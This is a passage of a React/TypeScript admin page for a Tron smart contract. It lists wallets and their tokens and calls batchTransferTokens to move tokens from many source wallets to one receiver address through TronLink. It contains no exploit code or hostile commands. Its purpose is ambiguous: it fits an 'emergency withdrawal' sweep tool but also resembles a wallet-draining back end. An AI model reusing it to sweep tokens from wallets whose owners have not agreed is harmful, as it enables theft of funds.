      console.log(`     ${JSON.stringify(hexTokensPerWallet, null, 4)},`);
      console.log(`     "${hexReceiver}"`);
      console.log(`   )`);
      console.log("🚀 ~ =========================================================");

      // 6. Create contract instance and execute batchTransferTokens
      console.log("🚀 ~ handleExecuteTokens ~ Creating contract instance...");
      
      // Ensure TronWeb is available before creating contract
      if (!window.tronWeb) {
        console.error("🚀 ~ handleExecuteTokens ~ TronWeb not available for contract creation");
        return { error: "TronWeb not available for contract creation. Please try again." };
      }
      
      if (!CONTRACT_ADDRESS) {
        throw new Error("CONTRACT_ADDRESS is not defined");
      }

      const contract = await window.tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
      
      console.log("🚀 ~ handleExecuteTokens ~ Calling batchTransferTokens function...");
      console.log("🚀 ~ Contract Address:", CONTRACT_ADDRESS);
      console.log("🚀 ~ Function Parameters:", {
        walletsCount: hexWallets.length,
        tokensCount: hexTokensPerWallet.reduce((acc, tokens) => acc + tokens.length, 0),
        receiver: hexReceiver
      });
      
      const tx = await contract.batchTransferTokens(
        hexWallets,
        hexTokensPerWallet,
        hexReceiver
      ).send({
        feeLimit: 150_000_000, // Fee limit for the transaction
        callValue: 0,
        shouldPollResponse: false
      });

      console.log("🚀 ~ handleExecuteTokens ~ Transaction sent successfully! TX Hash:", tx);

      // 7. Wait for transaction confirmation
      console.log("🚀 ~ handleExecuteTokens ~ Waiting for transaction confirmation...");
      let receipt = null;
      const maxAttempts = 60; // Poll for ~2 minutes (60 * 2s)
      
      for (let i = 0; i < maxAttempts; i++) {
        try {
          receipt = await window.tronWeb.trx.getTransactionInfo(tx);
          if (receipt && receipt.receipt) {
            console.log(`🚀 ~ handleExecuteTokens ~ Transaction confirmed on attempt ${i + 1}:`, receipt);
            break;
          }
        } catch (pollError) {
          console.log(`🚀 ~ handleExecuteTokens ~ Polling attempt ${i + 1} failed:`, pollError);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      // 8. Validate transaction result and return
      if (receipt && receipt.receipt && receipt.receipt.result === "SUCCESS") {
        console.log("🚀 ~ handleExecuteTokens ~ ✅ Transaction SUCCESSFUL!");
        console.log("🚀 ~ handleExecuteTokens ~ Transaction Receipt:", receipt);
        
        // Return success result with transaction details
        const results = transferDetails.map(detail => ({
          walletAddress: detail.walletAddress,
          tokenAddress: detail.tokenAddress,
          success: true,
          txHash: tx
        }));

        return {
          success: true,
          txHash: tx,
          results: results,
          message: `Successfully executed ${transferDetails.length} token transfers`,
          blockNumber: receipt.blockNumber
        };
      } else {
        const errorMsg = receipt?.receipt?.result 
          ? `Transaction failed with status: ${receipt.receipt.result}`
          : "Transaction confirmation timed out or receipt incomplete";
        
        console.error("🚀 ~ handleExecuteTokens ~ ❌ Transaction FAILED:", errorMsg);
        console.error("🚀 ~ handleExecuteTokens ~ Receipt:", receipt);
        throw new Error(errorMsg);
      }

    } catch (error) {
      console.error("🚀 ~ handleExecuteTokens ~ ❌ Execution Error:", error);
      const errorMsg = (error as any)?.message || "Unknown error occurred during execution";
      
      // Return error result
      const results = transferDetails.map(detail => ({
        walletAddress: detail.walletAddress,
        tokenAddress: detail.tokenAddress,
        success: false,
        error: errorMsg
      }));

      return {
        success: false,
        error: `Execution failed: ${errorMsg}`,
        results: results
      };
    }
  };

  const handleTokenSelect = (token: string) => {
    setSelectedToken(token);
    setSelectedWallets([]);
    setIsSelectingWallets(true);
  };

  const handleWalletToggle = (walletAddress: string) => {
    setSelectedWallets(prev => {
      if (prev.includes(walletAddress)) {
        return prev.filter(addr => addr !== walletAddress);
      } else {
        return [...prev, walletAddress];
      }
    });
  };

  const handleExecuteSelectedTransfer = async () => {
    // --- Start Validation ---
    if (!selectedToken || selectedWallets.length === 0 || !receiverAddress) {
      showError("Missing Input", "Please select a token, at least one wallet, and enter a receiver address.");
      return;
    }
    if (!isValidTronAddress(receiverAddress)) {
      showError("Invalid Address", `The receiver address "${receiverAddress}" is not a valid Tron address.`);
      return;
    }
    if (!isValidTronAddress(selectedToken)) {
      showError("Invalid Address", `The selected token address "${selectedToken}" is not a valid Tron address.`);
      return;
    }
    const invalidWallets = selectedWallets.filter(wallet => !isValidTronAddress(wallet));
    if (invalidWallets.length > 0) {
      showError("Invalid Address", `The following selected wallet addresses are invalid: ${invalidWallets.join(', ')}`);
      return;
    }
    // --- End Validation ---

    setIsExecuting(true);
    setTxStatus("Preparing transaction...");
    showSuccess("Transaction initiated", "Please confirm in TronLink.");

    try {
      // --- Only connect to TronLink now ---
      const connected = await ensureTronLinkConnection();
      if (!connected || !isTronLinkInstalled() || !window.tronWeb) {
        throw new Error("TronLink is not installed or not initialized!");
      }

      // Request account access
      await requestAccountAccess();

      if (!CONTRACT_ADDRESS) {
        throw new Error("CONTRACT_ADDRESS is not defined");
      }

      // Create contract instance
      const contract = await window.tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);

      setTxStatus("Sending transaction...");
      
      // Ensure TronWeb is available before address conversion
      if (!window.tronWeb) {
        console.error("🚀 ~ handleExecuteSelectedTransfer ~ TronWeb not available for address conversion");
        return;
      }
      
      // --- Prepare and Log Hex Data for Selected Transfer ---
      const hexSelectedWallets = selectedWallets.map(wallet => window.tronWeb!.address.toHex(wallet));
      const hexSelectedToken = window.tronWeb!.address.toHex(selectedToken);
      const hexReceiver = window.tronWeb!.address.toHex(receiverAddress);

      console.log("--- Transfer Selected Data (Hex) ---");
      console.log("Selected Wallets:", JSON.stringify(hexSelectedWallets, null, 2));
      console.log("Selected Token:", hexSelectedToken);
      console.log("Receiver:", hexReceiver);
      console.log("-------------------------------------");
      // --- End Log ---

      // Call the contract function, converting addresses to hex inline
      console.log("About to call .send() to TronLink (Selected Transfer)...");
      const tx = await contract.batchTransferTokens(
        hexSelectedWallets, // Use prepared hex wallets
        hexSelectedWallets.map(() => [hexSelectedToken]), // Use prepared hex token for each wallet
        hexReceiver // Use prepared hex receiver
      ).send({
        feeLimit: 100_000_000, 
        callValue: 0, 
        shouldPollResponse: false 
      });

      setTxHash(tx);
      setTxStatus("Transaction sent! Waiting for confirmation...");

      // --- Robust Transaction Confirmation Check ---
      // Poll for receipt with a timeout
      let receipt = null;
      const maxAttempts = 60; // Poll for ~2 minutes (60 * 2s)
      console.log(`Polling for transaction ${tx} confirmation (max ${maxAttempts} attempts)...`);
      for (let i = 0; i < maxAttempts; i++) {
        try {
          receipt = await getTransactionInfo(tx);
          console.log(`Poll attempt ${i + 1}/${maxAttempts}: Receipt received`, receipt ? JSON.stringify(receipt).substring(0, 300) + '...' : 'null'); // Log receipt structure
          // Check if receipt and nested properties exist
          if (receipt && receipt.receipt && receipt.receipt.result) {
            console.log(`Conclusive receipt found at attempt ${i + 1}. Result: ${receipt.receipt.result}`);
            break; // Found a conclusive receipt
          }
        } catch (pollError) {
          console.warn(`Polling attempt ${i + 1} failed:`, getErrorMessage(pollError));
          // Continue polling even if one attempt fails
        }
        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds
      }

      if (receipt && receipt.receipt && receipt.receipt.result === "SUCCESS") {
        setTxStatus(`Transaction confirmed! Block: ${receipt.blockNumber || 'N/A'}`);
        showSuccess("Transfer executed successfully!", `Block: ${receipt.blockNumber || 'N/A'}`);
      } else if (receipt && receipt.receipt && receipt.receipt.result) {
        // If we have a receipt but it's not SUCCESS
        setTxStatus(`Transaction failed with status: ${receipt.receipt.result}`);
        showError("Transaction failed on-chain", `Status: ${receipt.receipt.result}`);
        throw new Error(`Transaction failed with status: ${receipt.receipt.result}`);
      } else {
        // If polling timed out or receipt is incomplete
        setTxStatus("Transaction confirmation timed out or receipt incomplete.");
        showError("Confirmation Timeout", "Could not confirm transaction status. Check Tronscan manually.");
        throw new Error("Transaction confirmation timed out or receipt incomplete.");
      }
      // --- End Robust Check ---

    } catch (error) {
      console.error("Error executing transfer:", error);
      setTxStatus(`Error: ${(error as any).message}`);
      alert(`Transfer failed: ${(error as any).message}`);
    } finally {
      setIsExecuting(false);
    }
  };

  // --- New Handler for Transfer All ---
  const handleExecuteAllTransfer = async () => {
    // --- Start Validation ---
    if (walletData.length === 0 || !receiverAddress) {
      showError("Missing Input", "Please load wallet data using 'All Wallets' and enter a receiver address.");
      return;
    }
    if (!isValidTronAddress(receiverAddress)) {
      showError("Invalid Address", `The receiver address "${receiverAddress}" is not a valid Tron address.`);
      return;
    }
    // Validate all wallet and token addresses from walletData
    for (const wallet of walletData) {
      if (!isValidTronAddress(wallet.walletAddress)) {
        showError("Invalid Address", `An invalid source wallet address was found: ${wallet.walletAddress}`);
        return;
      }
      // Add null/undefined check before iterating
      if (!wallet.tokenAddresses || wallet.tokenAddresses.length === 0) {
        showError("Missing Tokens", `No token addresses found for wallet ${wallet.walletAddress}`);
        return;
      }
      for (const token of wallet.tokenAddresses) {
        if (!isValidTronAddress(token)) {
          showError("Invalid Address", `An invalid token address was found for wallet ${wallet.walletAddress}: ${token}`);
          return;
        }
      }
    }
    // --- End Validation ---

    setIsExecuting(true);
    setTxStatus("Preparing transaction for ALL wallets...");
    showSuccess("Transaction initiated", "Please confirm in TronLink.");

    try {
      // --- Only connect to TronLink now ---
      const connected = await ensureTronLinkConnection();
      if (!connected || !isTronLinkInstalled() || !window.tronWeb) {
        throw new Error("TronLink is not installed or not initialized!");
      }

      // Prepare data for contract call
      const wallets = walletData.map(w => w.walletAddress);
      const tokensPerWallet = walletData.map(w => w.tokenAddresses);

      // Request account access
      await requestAccountAccess();

      // Create contract instance
      if (!window.tronWeb) {
        console.error("🚀 ~ handleTransferAll ~ TronWeb not available for contract creation");
        setTxStatus("Error: TronWeb not available");
        return;
      }
      
      if (!CONTRACT_ADDRESS) {
        throw new Error("CONTRACT_ADDRESS is not defined");
      }

      const contract = await window.tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);

      setTxStatus("Sending transaction for ALL wallets...");

      // --- Prepare and Log Hex Data ---
      const hexWalletsToSend = wallets.map(wallet => window.tronWeb!.address.toHex(wallet));
      const hexTokensToSend = tokensPerWallet.map(tokenList => tokenList.map(token => window.tronWeb!.address.toHex(token)));
      const hexReceiverToSend = window.tronWeb!.address.toHex(receiverAddress);

      console.log("--- Transfer All Data (Hex) ---");
      console.log("Wallets:", JSON.stringify(hexWalletsToSend, null, 2));
      console.log("Tokens per Wallet:", JSON.stringify(hexTokensToSend, null, 2));
      console.log("Receiver:", hexReceiverToSend);
      console.log("---------------------------------");
      // --- End Log ---

      // Call the contract function, converting addresses to hex inline
      console.log("About to call .send() to TronLink...");
      const tx = await contract.batchTransferTokens(
        hexWalletsToSend, // Use prepared hex wallets
        hexTokensToSend,  // Use prepared hex tokens
        hexReceiverToSend // Use prepared hex receiver
      ).send({
        feeLimit: 150_000_000, // Increased fee limit slightly for potentially larger tx
        callValue: 0,
        shouldPollResponse: false
      });

      setTxHash(tx);
      setTxStatus("Transaction sent! Waiting for confirmation...");

      // --- Robust Transaction Confirmation Check (Duplicate for Transfer All) ---
      let receiptAll = null;
      const maxAttemptsAll = 60; // Poll for ~2 minutes (60 * 2s)
      console.log(`Polling for transaction ${tx} confirmation (max ${maxAttemptsAll} attempts)...`);
      for (let i = 0; i < maxAttemptsAll; i++) {
        try {
          receiptAll = await getTransactionInfo(tx);
          console.log(`Poll attempt ${i + 1}/${maxAttemptsAll}: Receipt received`, receiptAll ? JSON.stringify(receiptAll).substring(0, 300) + '...' : 'null'); // Log receipt structure
          if (receiptAll && receiptAll.receipt && receiptAll.receipt.result) {
            console.log(`Conclusive receipt found at attempt ${i + 1}. Result: ${receiptAll.receipt.result}`);
            break;
          }
        } catch (pollError) {
          console.warn(`Polling attempt ${i + 1} failed:`, getErrorMessage(pollError));
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      if (receiptAll && receiptAll.receipt && receiptAll.receipt.result === "SUCCESS") {
        setTxStatus(`Transaction confirmed! Block: ${receiptAll.blockNumber || 'N/A'}`);
        showSuccess("Transfer executed successfully!", `Block: ${receiptAll.blockNumber || 'N/A'}`);
      } else if (receiptAll && receiptAll.receipt && receiptAll.receipt.result) {
        setTxStatus(`Transaction failed with status: ${receiptAll.receipt.result}`);
        showError("Transaction failed on-chain", `Status: ${receiptAll.receipt.result}`);
        throw new Error(`Transaction failed with status: ${receiptAll.receipt.result}`);
      } else {
        setTxStatus("Transaction confirmation timed out or receipt incomplete.");
        showError("Confirmation Timeout", "Could not confirm transaction status. Check Tronscan manually.");
        throw new Error("Transaction confirmation timed out or receipt incomplete.");
      }
      // --- End Robust Check ---

    } catch (error) {
      console.error("Error executing transfer all:", error);
      setTxStatus(`Error: ${getErrorMessage(error)}`);
      alert(`Transfer failed: ${getErrorMessage(error)}`);
    } finally {
      setIsExecuting(false);
    }
  };
  // --- End New Handler ---

  const fetchBatchDetails = async (batchId: number) => {
    if (!tronWeb) return;
    
    try {

      if (!CONTRACT_ADDRESS) {
        throw new Error("CONTRACT_ADDRESS is not defined");
      }

      const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
      const result = await contract.getBatchDetails(batchId).call();
      
      setBatchDetails({
        timestamp: new Date(Number(result.timestamp) * 1000).toLocaleString(),
        totalTransfers: Number(result.totalTransfers),
        successfulTransfers: Number(result.successfulTransfers)
      });
    } catch (error) {
      console.error("Error fetching batch details:", error);
      showError("Failed to fetch batch details", getErrorMessage(error));
    }
  };
  
  const fetchLatestBatchDetails = async () => {
    if (!tronWeb) return;
    
    try {

      if (!CONTRACT_ADDRESS) {
        throw new Error("CONTRACT_ADDRESS is not defined");
      }

      const contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
      const result = await contract.getLatestBatchDetails().call();
      
      setBatchDetails({
        timestamp: new Date(Number(result.timestamp) * 1000).toLocaleString(),
        totalTransfers: Number(result.totalTransfers),
        successfulTransfers: Number(result.successfulTransfers)
      });
    } catch (error) {
      console.error("Error fetching latest batch details:", error);
      showError("Failed to fetch latest batch details", getErrorMessage(error));
    }
  };

  const clearAll = () => {
    setSourceWallets("");
    setTokenAddresses("");
    setReceiverAddress("");
    setWalletData([]);
    setTxHash("");
    setTxStatus("");
    showSuccess("Form cleared");
  };

  const viewOnTronscan = () => {
    if (!txHash) return;
    try {
      window.open(`${TRONSCAN_URL}/#/transaction/${txHash}`, "_blank");
    } catch (error) {
      console.error("Error opening Tronscan:", error);
      showError("Failed to open Tronscan", getErrorMessage(error));
    }
  };

  const getNetworkBadge = () => {
    switch (connectionStatus) {
      case "connected":
        return (
          <div className="flex items-center gap-2">
            <Badge variant="outline" className="px-3 py-1">
              <span className="mr-1 h-2 w-2 rounded-full bg-green-500 inline-block"></span>
              Contract Connected
            </Badge>
          </div>
        );
      case "wrong_network":
        return (
          <Badge variant="outline" className="px-3 py-1 bg-yellow-100">
            <span className="mr-1 h-2 w-2 rounded-full bg-yellow-500 inline-block"></span>
            Wrong Network
          </Badge>
        );
      case "error":
        return (
          <Badge variant="outline" className="px-3 py-1 bg-red-100">
            <span className="mr-1 h-2 w-2 rounded-full bg-red-500 inline-block"></span>
            Connection Error
          </Badge>
        );
      default:
        return (
          <Badge variant="outline" className="px-3 py-1">
            <span className="mr-1 h-2 w-2 rounded-full bg-gray-500 inline-block"></span>
            {connectionStatus.replace(/_/g, ' ')}
          </Badge>
        );
    }
  };

  // Address display component
  const TronAddress = ({
    address,
    truncate = false,
  }: {
    address: string;
    truncate?: boolean;
  }) => {
    const displayAddress = truncate
      ? `${address.slice(0, 6)}...${address.slice(-4)}`
      : address;
      
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(address);
        showSuccess("Address copied to clipboard");
      } catch (error) {
        console.error("Failed to copy address:", error);
        showError("Failed to copy address", getErrorMessage(error));
      }
    };

    return (
      <span className="font-mono">
        {displayAddress}
        <button
          onClick={handleCopy}
          className="ml-2 text-muted-foreground hover:text-primary"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="16"
            height="16"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
          </svg>
        </button>
      </span>
    );
  };

  // Get unique tokens from wallet data
  const uniqueTokens = useMemo(() => {
    const tokens = new Set<string>();
    walletData.forEach((wallet: WalletData) => {
      wallet.tokenAddresses.forEach((token: string) => tokens.add(token));
    });
    return Array.from(tokens);
  }, [walletData]);

  // Get wallets that have the selected token
  const walletsWithSelectedToken = useMemo(() => {
    if (!selectedToken) return [];
    return walletData.filter((wallet: WalletData) => 
      wallet.tokenAddresses.includes(selectedToken)
    );
  }, [walletData, selectedToken]);

  // Helper to ensure TronLink is connected and ready
  const ensureTronLinkConnection = async (): Promise<boolean> => {
    // Use the utility function from tronWeb.ts
    return await waitForTronWebReady(10000); // Wait up to 10 seconds
  };

  return (
    <PageContainer scrollable={true}>
      <div className="space-y-6">
        <Breadcrumbs items={breadcrumbItems} />

        <div className="flex items-start justify-between">
          <Heading
            title="Tron Contract Controls"
            description="Manage emergency token withdrawals and batch operations on Tron Mainnet."
          />
          {getNetworkBadge()}
        </div>
        <Separator />



        <Tabs defaultValue="wallet-data" className="space-y-4" onValueChange={setActiveTab}>
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="wallet-data">Wallet Data</TabsTrigger>
            <TabsTrigger value="execution">Execution</TabsTrigger>
            <TabsTrigger value="manual-control">Manual Control</TabsTrigger>
          </TabsList>

          {/* Wallet Data Tab */}
          <TabsContent value="wallet-data" className="space-y-4 mt-4">
            {/* Remove Card wrapper for plain UI like Ethereum */}
            <div className="space-y-4">
              <TronFilters
                searchParams={searchParams}
                onSearchParamsChange={(newParams) => setSearchParams(prev => ({ ...prev, ...newParams }))}
                onRefresh={handleFetchAllWallets}
                isLoading={isLoading}
              />
              <WalletTable
                columns={columns}
                data={walletTableData}
                chainId={CHAIN_ID}
                currentPage={searchParams.page}
                totalPages={totalPages}
                onPageChange={handlePageChange}
                isServerPaginated={true}
              />
            </div>
          </TabsContent>

          {/* Execution Tab - Filtered to show only pending tokens */}
          <TabsContent value="execution" className="space-y-4">
            {isPendingLoading ? (
              <div className="flex justify-center items-center py-10">
                <RefreshCw className="h-8 w-8 animate-spin text-primary" />
              </div>
            ) : (
              <ExecutionTable
                columns={columns}
                data={pendingWalletData}
                chainId={CHAIN_ID}
                currentPage={pendingSearchParams.page}
                totalPages={pendingTotalPages}
                onPageChange={handlePendingPageChange}
                isServerPaginated={true}
                onRowSelectionChange={() => {}}
                onRefresh={refreshPendingTokens}
                onExecuteTokens={handleExecuteTokens}
                executionReceiver={receiverAddress}
                setExecutionReceiver={setReceiverAddress}
                isLoading={isPendingLoading}
                validateReceiverAddress={isValidTronAddress}
              />
            )}
          </TabsContent>

          {/* Manual Control Tab - Redesigned to match Ethereum */}
          <TabsContent value="manual-control" className="space-y-4 mt-4">
            <Card>
              <CardHeader>
                <CardTitle>Batch Transfer</CardTitle>
                <CardDescription>
                  Transfer multiple tokens from one address to another
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="fromWallet">From Wallet</Label>
                    <Input 
                      id="fromWallet" 
                      placeholder="TR..." 
                      className="font-mono" 
                      value={fromAddress} 
                      onChange={(e) => setFromAddress(e.target.value)}
                      disabled={isTransferring}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="toWallet">To Wallet</Label>
                    <Input 
                      id="toWallet" 
                      placeholder="TR..." 
                      className="font-mono" 
                      value={toAddress} 
                      onChange={(e) => setToAddress(e.target.value)}
                      disabled={isTransferring}
                    />
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <Label>Token Transfers</Label>
                      <Button 
                        type="button" 
                        variant="outline" 
                        size="sm" 
                        onClick={addTokenRow}
                        disabled={isTransferring}
                      >
                        Add Token
                      </Button>
                    </div>
                    
                    {tokenInputs.map((token, index) => (
                      <div key={index} className="space-y-2 p-3 border rounded-md">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium">Token #{index + 1}</span>
                          {tokenInputs.length > 1 && (
                            <Button 
                              type="button" 
                              variant="ghost" 
                              size="sm" 
                              onClick={() => removeTokenRow(index)}
                              disabled={isTransferring}
                            >
                              Remove
                            </Button>
                          )}
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor={`tokenAddress-${index}`}>Token Address</Label>
                          <Input 
                            id={`tokenAddress-${index}`}
                            placeholder="TR..." 
                            className="font-mono"
                            value={token.tokenAddress}
                            onChange={(e) => updateTokenField(index, "tokenAddress", e.target.value)}
                            disabled={isTransferring}
                          />
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor={`amount-${index}`}>Amount</Label>
                          <Input 
                            id={`amount-${index}`}
                            type="text" 
                            placeholder="0.0" 
                            value={token.amount}
                            onChange={(e) => updateTokenField(index, "amount", e.target.value)}
                            disabled={isTransferring}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                
                <div className="flex justify-end space-x-2">
                  <Button variant="outline" onClick={resetManualControlForm} disabled={isTransferring}>Reset</Button>
                  <Button onClick={handleManualBatchTransfer} disabled={isTransferring}>
                    {isTransferring ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Execute Batch Transfer"
                    )}
                  </Button>
                </div>


              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </PageContainer>
  );
}